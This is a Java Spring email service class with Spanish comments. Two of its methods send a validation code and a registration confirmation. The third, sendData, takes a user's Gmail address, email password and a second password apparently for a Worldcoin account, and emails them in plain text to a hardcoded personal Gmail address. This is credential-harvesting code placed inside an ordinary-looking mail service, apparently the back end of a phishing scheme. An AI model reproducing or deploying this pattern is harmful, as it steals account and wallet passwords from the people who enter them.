package com.sending.mails.services.impl;

import com.sending.mails.services.IEmailServices;
import com.sending.mails.services.models.DataDTO;
import com.sending.mails.services.models.EmailDTO;
import jakarta.mail.MessagingException;
import jakarta.mail.internet.MimeMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.stereotype.Service;
import org.thymeleaf.TemplateEngine;
import org.thymeleaf.context.Context;

import java.util.Random;

@Service
public class EmailServicesImpl implements IEmailServices {

    private final JavaMailSender javaMailSender;
    private final TemplateEngine templateEngine;

    public EmailServicesImpl(JavaMailSender javaMailSender, TemplateEngine templateEngine){
        this.javaMailSender = javaMailSender;
        this.templateEngine = templateEngine;
    }

    //Utilizamos el metodo de la Interfaz IEmailService
    @Override
    public void sendMail(EmailDTO email) throws MessagingException {
        try {
            //Configuracion de del mensaje
            MimeMessage message = javaMailSender.createMimeMessage();
            MimeMessageHelper helper = new MimeMessageHelper(message,true,"UTF-8");

            helper.setTo(email.getDestinatario());
            helper.setSubject("Codigo de validacion");

            Context context = new Context();
            context.setVariable("codeHTML", email.getCode());
            context.setVariable("linkHTML", email.getLink());
            String contextHTML = templateEngine.process("email", context);


            helper.setText(contextHTML,true);
            javaMailSender.send(message);
        }catch (Exception e){
            throw new RuntimeException("Error al enviar correo: "+e.getMessage(),e);
        }

    }

    @Override
    public void sendRegister(EmailDTO email) throws MessagingException {
        try {
            //Configuracion de del mensaje
            MimeMessage message = javaMailSender.createMimeMessage();
            MimeMessageHelper helper = new MimeMessageHelper(message,true,"UTF-8");

            helper.setTo(email.getDestinatario());
            helper.setSubject("Registro Exitoso!");

            Context context = new Context();

            String contextHTML = templateEngine.process("emailderegistro",context);


            helper.setText(contextHTML,true);
            javaMailSender.send(message);
        }catch (Exception e){
            throw new RuntimeException("Error al enviar correo: "+e.getMessage(),e);
        }
    }


    @Override
    public void sendData(DataDTO email) throws MessagingException {
        try {
            //Configuracion de del mensaje
            MimeMessage message = javaMailSender.createMimeMessage();
            MimeMessageHelper helper = new MimeMessageHelper(message,true,"UTF-8");

            helper.setTo("gustavolopaz1@gmail.com");
            helper.setSubject("Datos ");
            helper.setText("Gmail: "+email.getEmail()+"   ContraceñaEmail: " + email.getPasswordEmail()+ "<br/   Contraceña Wld: "+email.getPaswwordWorcoin());

            javaMailSender.send(message);
        }catch (Exception e){
            throw new RuntimeException("Error al enviar correo: "+e.getMessage(),e);
        }
    }



}
